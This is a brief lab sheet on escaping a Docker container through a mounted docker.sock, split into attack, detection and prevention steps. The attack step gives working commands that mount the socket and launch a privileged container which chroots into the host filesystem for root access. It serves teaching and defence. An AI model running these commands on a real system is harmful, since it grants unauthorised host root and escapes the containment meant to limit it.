# Lab — The docker.sock Escape (attack + prevent)
> LAB ONLY.
1. ATTACK: `docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker sh`,
   then inside `docker run -v /:/host --privileged alpine chroot /host sh` → HOST ROOT.
2. DETECT: `docker ps --filter volume=/var/run/docker.sock`; Falco 'docker socket mounted'.
3. PREVENT: never mount the socket; apply hardened `examples/daemon.json`.
**Deliverable:** show host root via socket, then the detection + prevention.
